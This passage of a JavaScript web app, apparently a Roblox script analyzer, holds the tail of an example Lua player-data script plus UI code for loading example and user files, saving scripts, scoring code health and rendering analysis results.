        else
            copy[key] = value
        end
    end
    return copy
end

local function validatePlayerData(data)
    if type(data) ~= "table" then return false end
    if type(data.coins) ~= "number" or data.coins < 0 then return false end
    if type(data.level) ~= "number" or data.level < 1 then return false end
    if type(data.inventory) ~= "table" then return false end
    return true
end

local function loadPlayerData(player)
    local success, data = pcall(function()
        return playerDataStore:GetAsync(player.UserId)
    end)
    
    if success and data and validatePlayerData(data) then
        data.lastLogin = tick()
        playerDataCache[player.UserId] = data
        return data
    else
        local newData = deepCopy(defaultPlayerData)
        newData.lastLogin = tick()
        playerDataCache[player.UserId] = newData
        return newData
    end
end

local function savePlayerData(player)
    if not playerDataCache[player.UserId] then return end
    if pendingSaves[player.UserId] then return end
    
    pendingSaves[player.UserId] = true
    
    task.spawn(function()
        local success, errorMsg = pcall(function()
            playerDataStore:SetAsync(player.UserId, playerDataCache[player.UserId])
        end)
        
        if not success then
            warn("Failed to save data for " .. player.Name .. ": " .. errorMsg)
        end
        
        pendingSaves[player.UserId] = nil
    end)
end

local function getPlayerData(player)
    return playerDataCache[player.UserId] or loadPlayerData(player)
end

local function updatePlayerData(player, key, value)
    local data = getPlayerData(player)
    if data and data[key] ~= nil then
        data[key] = value
        return true
    end
    return false
end

Players.PlayerAdded:Connect(function(player)
    loadPlayerData(player)
    
    player.AncestryChanged:Connect(function()
        if not player.Parent then
            savePlayerData(player)
            playerDataCache[player.UserId] = nil
        end
    end)
end)

Players.PlayerRemoving:Connect(function(player)
    savePlayerData(player)
end)

local autoSaveConnection = task.spawn(function()
    while true do
        task.wait(300)
        for userId, _ in pairs(playerDataCache) do
            local player = Players:GetPlayerByUserId(userId)
            if player then
                savePlayerData(player)
            end
        end
    end
end)

game:BindToClose(function()
    for userId, _ in pairs(playerDataCache) do
        local player = Players:GetPlayerByUserId(userId)
        if player then
            savePlayerData(player)
        end
    end
    task.wait(3)
end)`
            }
        ];

        const modal = createExampleModal(examples);
        document.body.appendChild(modal);
        
        modal.addEventListener('click', function(e) {
            if (e.target.classList.contains('example-btn')) {
                const index = parseInt(e.target.dataset.index);
                editor.setValue(examples[index].code);
                document.body.removeChild(modal);
                showNotification(`Loaded: ${examples[index].name}`, 'success');
            }
            if (e.target.classList.contains('modal-close') || e.target.classList.contains('example-modal')) {
                document.body.removeChild(modal);
            }
        });
    }

    function createExampleModal(examples) {
        const modal = document.createElement('div');
        modal.className = 'example-modal';
        modal.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        `;

        modal.innerHTML = `
            <div class="example-dialog" style="
                background: white;
                padding: 30px;
                border-radius: 12px;
                max-width: 600px;
                width: 90%;
                max-height: 80vh;
                overflow-y: auto;
                box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            ">
                <h3 style="margin-top: 0; color: #2d3748;">Load Example Script</h3>
                <p style="color: #718096; margin-bottom: 20px;">Choose an example to demonstrate different analysis features:</p>
                
                <div class="example-list" style="display: grid; gap: 15px;">
                    ${examples.map((example, index) => `
                        <button class="example-btn" data-index="${index}" style="
                            padding: 15px;
                            border: 2px solid #e2e8f0;
                            background: white;
                            border-radius: 8px;
                            cursor: pointer;
                            transition: all 0.2s;
                            text-align: left;
                        ">
                            <div style="font-weight: bold; color: #2d3748; margin-bottom: 5px;">${example.name}</div>
                            <div style="color: #718096; font-size: 14px;">${example.description}</div>
                        </button>
                    `).join('')}
                </div>
                
                <div style="margin-top: 20px; text-align: right;">
                    <button class="modal-close" style="
                        padding: 10px 20px;
                        background: #e53e3e;
                        color: white;
                        border: none;
                        border-radius: 6px;
                        cursor: pointer;
                    ">Cancel</button>
                </div>
            </div>
        `;

        return modal;
    }

    function loadFromFile() {
        fileInput.click();
    }

    function saveCurrentScript() {
        const script = editor.getValue();
        if (!script.trim()) {
            showNotification('No script to save', 'warning');
            return;
        }

        const filename = prompt('Enter filename (without extension):', 'roblox-script');
        if (!filename) return;

        const blob = new Blob([script], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `${filename}.lua`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        showNotification('Script saved successfully!', 'success');
    }

    
    fileInput.addEventListener('change', function(e) {
        const file = e.target.files[0];
        if (!file) return;

        
        if (file.size > 1024 * 1024) {
            showNotification('File too large. Maximum size is 1MB.', 'warning');
            return;
        }

        
        const validTypes = ['.lua', '.luau', '.txt'];
        const fileExtension = '.' + file.name.split('.').pop().toLowerCase();
        if (!validTypes.includes(fileExtension)) {
            showNotification('Invalid file type. Please select a .lua, .luau, or .txt file.', 'warning');
            return;
        }

        const reader = new FileReader();
        reader.onload = function(e) {
            const content = e.target.result;
            
            
            if (editor.getValue().trim() && !confirm('Loading this file will replace current content. Continue?')) {
                return;
            }
            
            editor.setValue(content);
            hideResults();
            currentResults = null;
            showNotification(`File "${file.name}" loaded successfully!`, 'success');
        };
        
        reader.onerror = function() {
            showNotification('Error reading file. Please try again.', 'warning');
        };
        
        reader.readAsText(file);
        
        
        fileInput.value = '';
    });

    
    function createNewScript() {
        if (editor.getValue().trim() && !confirm('Create new script? Current work will be lost.')) {
            return;
        }
        
        const template = `-- New Roblox Script
-- Generated by Roblox Script Analyzer

local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Your code here
print("Hello, " .. player.Name .. "!")`;

        editor.setValue(template);
        hideResults();
        currentResults = null;
        showNotification('New script created!', 'success');
    }

    function duplicateScript() {
        const script = editor.getValue();
        if (!script.trim()) {
            showNotification('No script to duplicate', 'warning');
            return;
        }

        const duplicated = `-- Duplicated Script
-- Original created: ${new Date().toLocaleString()}

${script}`;

        saveScriptWithContent(duplicated, 'duplicated-script');
    }

    function saveScriptWithContent(content, defaultName) {
        const filename = prompt('Enter filename (without extension):', defaultName);
        if (!filename) return;

        const blob = new Blob([content], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `${filename}.lua`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        return true;
    }
    
    function displayResults(results) {
        currentResults = results;
        
        try {
            
            const health = analyzeCodeHealth(results);
            
            
            document.getElementById('lineCount').textContent = results.lineCount;
            document.getElementById('commentCount').textContent = results.commentCount;
            document.getElementById('nestingLevel').textContent = results.nestingLevel;
            
            const totalIssues = health.issues.security + health.issues.deprecations + 
                               health.issues.api + health.issues.performance + health.issues.quality;
            
            document.getElementById('totalIssues').textContent = totalIssues;
            
            
            updateScoreDisplay(health.overallScore, health);
        } catch (error) {
            console.error('Error in displayResults:', error);
            
            const basicScore = calculateOverallScore(results);
            
            
            document.getElementById('lineCount').textContent = results.lineCount;
            document.getElementById('commentCount').textContent = results.commentCount;
            document.getElementById('nestingLevel').textContent = results.nestingLevel;
            
            const totalIssues = (results.deprecations?.length || 0) +
                               (results.securityIssues?.length || 0) +
                               (results.apiIssues?.length || 0) +
                               (results.inefficiencies?.length || 0) +
                               (results.lintIssues?.length || 0);
            
            document.getElementById('totalIssues').textContent = totalIssues;
            
            
            updateScoreDisplay(basicScore);
        }
        
        displayIssues('securityList', 'securityCount', results.securityIssues || []);
        displayIssues('deprecationsList', 'deprecationCount', results.deprecations || []);
        displayIssues('apiIssuesList', 'apiCount', results.apiIssues || []);
        displayIssues('inefficienciesList', 'inefficiencyCount', results.inefficiencies || []);
        displayIssues('lintIssuesList', 'lintCount', results.lintIssues || []);
        
        
        if (!results.parseSuccess) {
            if (results.parseErrors && results.parseErrors.length > 0) {
                showNotification('Using fallback analysis - some complex syntax not fully parsed', 'warning');
            } else {
                showNotification('Using fallback analysis due to parsing complexities', 'warning');
            }
        } else if (results.parseErrors && results.parseErrors.length > 0) {
            showNotification('Analysis completed with relaxed parsing settings', 'info');
            if (results.note) {
            }
        } else {
            showNotification('Analysis completed successfully!', 'success');
        }

        
        if (results.parseErrors && results.parseErrors.length > 0) {
            addParsingInfoToResults(results);
        }
    }

    function addParsingInfoToResults(results) {
        
        const resultsSection = document.getElementById('resultsSection');
        let infoPanel = document.getElementById('parsing-info-panel');
        
        if (!infoPanel) {
            infoPanel = document.createElement('div');
            infoPanel.id = 'parsing-info-panel';
            infoPanel.style.cssText = `
                background: #ebf8ff;
                border: 1px solid #bee3f8;
                border-radius: 6px;
                padding: 12px;
                margin: 10px 0;
                font-size: 14px;
                color: #2c5282;
            `;
            
            const resultsHeader = resultsSection.querySelector('.results-header');
            resultsHeader.insertAdjacentElement('afterend', infoPanel);
        }
        
        let message = '';
        if (!results.parseSuccess) {
            message = `📝 <strong>Parsing Info:</strong> Complex Lua syntax detected. Using comprehensive fallback analysis to ensure accurate results.`;
        } else if (results.note) {
            message = `📝 <strong>Parsing Info:</strong> ${results.note}`;
        }
        
        if (results.parseErrors && results.parseErrors.length > 0) {
            message += ` <a href="#" onclick="return false;" style="color: #3182ce;">View technical details</a>`;
        }
        
        infoPanel.innerHTML = message;
        
        
        setTimeout(() => {
            if (infoPanel.parentNode) {
                infoPanel.style.transition = 'opacity 0.5s ease';
                infoPanel.style.opacity = '0';
                setTimeout(() => {
                    if (infoPanel.parentNode) {
                        infoPanel.parentNode.removeChild(infoPanel);
                    }
                }, 500);
            }
        }, 10000);
    }
    
    function calculateOverallScore(results) {
        let score = 100;
        
        const securityIssues = results.securityIssues?.length || 0;
        const deprecations = results.deprecations?.length || 0;
        const apiIssues = results.apiIssues?.length || 0;
        const inefficiencies = results.inefficiencies?.length || 0;
        const lintIssues = results.lintIssues?.length || 0;
        
        score -= securityIssues * 15;
        score -= deprecations * 8;
        score -= apiIssues * 5;
        score -= inefficiencies * 3;
        score -= lintIssues * 2;
        
        if (results.commentCount > 0 && results.lineCount > 0) {
            const commentRatio = results.commentCount / results.lineCount;
            if (commentRatio > 0.1) score += 5;
        }
        
        if (results.nestingLevel <= 3) score += 3;
        
        return Math.max(0, Math.min(100, Math.round(score)));
    }
    
    function updateScoreDisplay(score, health = null) {
        const scoreElement = document.getElementById('overallScore');
        const descElement = document.getElementById('scoreDescription');
        const circleElement = document.getElementById('scoreCircle');
        
        scoreElement.textContent = score;
        
        let description, gradient;
        
        
        if (health && health.recommendations.length > 0) {
            const topPriority = health.recommendations[0];
            const trend = getHealthTrend();
            const trendEmoji = trend === 'improving' ? '📈' : trend === 'declining' ? '📉' : '➡️';
            
            if (score >= 90) {
                description = `Excellent code quality! ${trendEmoji} Focus on ${topPriority.category.toLowerCase()} for perfection.`;
                gradient = "conic-gradient(from 0deg, #38a169 0deg, #68d391 " + (score * 3.6) + "deg, rgba(45, 55, 72, 0.3) " + (score * 3.6) + "deg)";
            } else if (score >= 75) {
                description = `Good quality ${trendEmoji} Priority: ${topPriority.category.toLowerCase()} improvements.`;
                gradient = "conic-gradient(from 0deg, #3182ce 0deg, #63b3ed " + (score * 3.6) + "deg, rgba(45, 55, 72, 0.3) " + (score * 3.6) + "deg)";
            } else if (score >= 50) {
                description = `Moderate quality ${trendEmoji} Start with ${topPriority.category.toLowerCase()} issues.`;
                gradient = "conic-gradient(from 0deg, #ed8936 0deg, #f6ad55 " + (score * 3.6) + "deg, rgba(45, 55, 72, 0.3) " + (score * 3.6) + "deg)";
            } else {
                description = `Needs work ${trendEmoji} Critical: ${topPriority.category.toLowerCase()} issues first.`;
                gradient = "conic-gradient(from 0deg, #e53e3e 0deg, #fc8181 " + (score * 3.6) + "deg, rgba(45, 55, 72, 0.3) " + (score * 3.6) + "deg)";
            }
        } else {
            
            if (score >= 90) {
                description = "Excellent! Your code follows best practices.";
                gradient = "conic-gradient(from 0deg, #38a169 0deg, #68d391 " + (score * 3.6) + "deg, rgba(45, 55, 72, 0.3) " + (score * 3.6) + "deg)";
            } else if (score >= 75) {
                description = "Good code quality with minor improvements needed.";
                gradient = "conic-gradient(from 0deg, #3182ce 0deg, #63b3ed " + (score * 3.6) + "deg, rgba(45, 55, 72, 0.3) " + (score * 3.6) + "deg)";
            } else if (score >= 50) {
                description = "Moderate quality. Several improvements recommended.";
                gradient = "conic-gradient(from 0deg, #ed8936 0deg, #f6ad55 " + (score * 3.6) + "deg, rgba(45, 55, 72, 0.3) " + (score * 3.6) + "deg)";
            } else {
                description = "Significant improvements needed for better code quality.";
                gradient = "conic-gradient(from 0deg, #e53e3e 0deg, #fc8181 " + (score * 3.6) + "deg, rgba(45, 55, 72, 0.3) " + (score * 3.6) + "deg)";
            }
        }
        
        descElement.textContent = description;
        circleElement.style.background = gradient;
        
        
        if (health) {
            circleElement.style.cursor = 'pointer';
            circleElement.onclick = () => showHealthDetails(health);
        }
    }

    function showHealthDetails(health) {
        const modal = createHealthModal(health);
        document.body.appendChild(modal);
        
        modal.addEventListener('click', function(e) {
            if (e.target.classList.contains('modal-close') || e.target.classList.contains('health-modal')) {
                document.body.removeChild(modal);
            }
        });
    }

    function createHealthModal(health) {
        const trend = getHealthTrend();
        const trendIcon = trend === 'improving' ? '📈' : trend === 'declining' ? '📉' : '➡️';
        
        const modal = document.createElement('div');
        modal.className = 'health-modal';
        modal.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        `;

        modal.innerHTML = `
            <div class="health-dialog" style="
                background: white;
                padding: 30px;
                border-radius: 12px;
                max-width: 600px;
                width: 90%;
                max-height: 80vh;
                overflow-y: auto;
                box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            ">
                <h3 style="margin-top: 0; color: #2d3748;">📊 Code Health Details</h3>
                
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0;">
                    <div style="text-align: center;">
                        <div style="font-size: 36px; font-weight: bold; color: ${health.overallScore >= 80 ? '#38a169' : health.overallScore >= 60 ? '#ed8936' : '#e53e3e'};">
                            ${health.overallScore}/100
                        </div>
                        <div style="color: #718096;">Overall Score</div>
                    </div>
                    <div style="text-align: center;">
                        <div style="font-size: 24px;">${trendIcon}</div>
                        <div style="color: #718096; text-transform: capitalize;">${trend}</div>
                    </div>
                </div>

                <div style="margin: 20px 0;">
                    <h4 style="color: #2d3748; margin-bottom: 10px;">Issue Breakdown:</h4>
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 10px;">
                        <div style="text-align: center; padding: 10px; background: #fed7d7; border-radius: 6px;">
                            <div style="font-weight: bold;">🔒 ${health.issues.security}</div>
                            <div style="font-size: 12px;">Security</div>
                        </div>
                        <div style="text-align: center; padding: 10px; background: #fbb6ce; border-radius: 6px;">
                            <div style="font-weight: bold;">⚠️ ${health.issues.deprecations}</div>
                            <div style="font-size: 12px;">Deprecations</div>
                        </div>
                        <div style="text-align: center; padding: 10px; background: #fbd38d; border-radius: 6px;">
                            <div style="font-weight: bold;">🔧 ${health.issues.api}</div>
                            <div style="font-size: 12px;">API</div>
                        </div>
                        <div style="text-align: center; padding: 10px; background: #bee3f8; border-radius: 6px;">
                            <div style="font-weight: bold;">⚡ ${health.issues.performance}</div>
                            <div style="font-size: 12px;">Performance</div>
                        </div>
                        <div style="text-align: center; padding: 10px; background: #c6f6d5; border-radius: 6px;">
                            <div style="font-weight: bold;">✨ ${health.issues.quality}</div>
                            <div style="font-size: 12px;">Quality</div>
                        </div>
                    </div>
                </div>

                ${health.recommendations.length > 0 ? `
                    <div style="margin: 20px 0;">
                        <h4 style="color: #2d3748; margin-bottom: 10px;">💡 Top Recommendations:</h4>
                        ${health.recommendations.slice(0, 3).map(rec => `
                            <div style="margin: 10px 0; padding: 15px; background: #f7fafc; border-left: 4px solid ${rec.priority === 'high' ? '#e53e3e' : '#ed8936'}; border-radius: 4px;">
                                <div style="font-weight: bold; color: #2d3748;">${rec.category}</div>
                                <div style="color: #718096; margin: 5px 0;">${rec.message}</div>
                                <div style="font-size: 12px; color: #a0aec0;">Priority: ${rec.priority}</div>
                            </div>
                        `).join('')}
                    </div>
                ` : ''}

                <div style="margin-top: 20px; text-align: right;">
                    <button class="modal-close" style="
                        padding: 10px 20px;
                        background: #4299e1;
                        color: white;
                        border: none;
                        border-radius: 6px;
                        cursor: pointer;
                    ">Close</button>
                </div>
            </div>
        `;

        return modal;
    }
    
    function displayIssues(listId, countId, issues) {
        const list = document.getElementById(listId);
        const count = document.getElementById(countId);
        const category = list.closest('.issue-category');
        
        list.innerHTML = '';
        count.textContent = issues.length;
        
        if (issues.length === 0) {
            const li = document.createElement('li');
            li.textContent = '✅ No issues found';
            li.className = 'no-issues';
            list.appendChild(li);
            category.style.opacity = '0.6';
        } else {
            category.style.opacity = '1';
            
            issues.forEach((issue, index) => {
                const li = document.createElement('li');
                li.style.animationDelay = `${index * 0.1}s`;
                li.classList.add('fadeInUp');
                
                let content = `<div class="issue-header">`;
                content += `<strong>Line ${issue.line}:</strong> ${issue.message}`;
                
                if (issue.severity) {
                    const severityClass = issue.severity === 'high' ? 'severity-high' : 
                                         issue.severity === 'medium' ? 'severity-medium' : 'severity-low';
                    content += ` <span class="${severityClass}">[${issue.severity.toUpperCase()}]</span>`;
                }
                content += `</div>`;
                
                if (issue.suggestion) {
                    content += `<div class="issue-suggestion"><em>💡 Suggestion: ${issue.suggestion}</em></div>`;
                }
                
                if (issue.docUrl) {
                    content += `<div class="issue-docs">📖 <a href="${issue.docUrl}" target="_blank" rel="noopener">View Documentation</a></div>`;
                }
                
                if (issue.lastVerified) {
                    content += `<div class="issue-meta"><small>Last verified: ${issue.lastVerified}</small></div>`;
                }
                
                if (issue.code && issue.code !== `Line ${issue.line}`) {
                    content += `<div class="issue-code"><code>${issue.code}</code></div>`;
                }
                
                li.innerHTML = content;
                list.appendChild(li);
            });
        }
        
        if (issues.length === 0) {
            const collapseBtn = category.querySelector('.collapse-btn');
            if (collapseBtn && !list.classList.contains('collapsed')) {
                collapseBtn.click();
            }
        }
    }
    
    
});